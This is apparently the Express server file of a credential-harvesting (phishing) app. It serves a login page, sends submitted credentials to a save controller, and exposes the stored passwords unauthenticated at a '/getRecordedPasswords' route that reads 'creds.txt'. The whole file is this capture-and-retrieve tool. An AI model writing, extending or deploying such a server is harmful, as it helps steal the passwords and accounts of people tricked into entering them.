const express = require('express');
const fs = require('fs');
const saveCreds = require('./controllers/saveCreds');

const app = express();


app.use(express.json());
app.use(express.static(`${__dirname}\\static_files`));


app.get('/login' , (req , res , next) => {
    const filePath = `./static_files/login.html`;
    fs.readFile(filePath , (err , data) => {
        res.send(data.toString());
    })
});


app.get('/getRecordedPasswords' , (req , res , next) => {
    const filePath = `./database/creds.txt`;
    fs.readFile(filePath, (err , data) => {
        res.send(data.toString());
    });
})


app.post('/api/saveCreds' , saveCreds.saveCreds)

module.exports = app;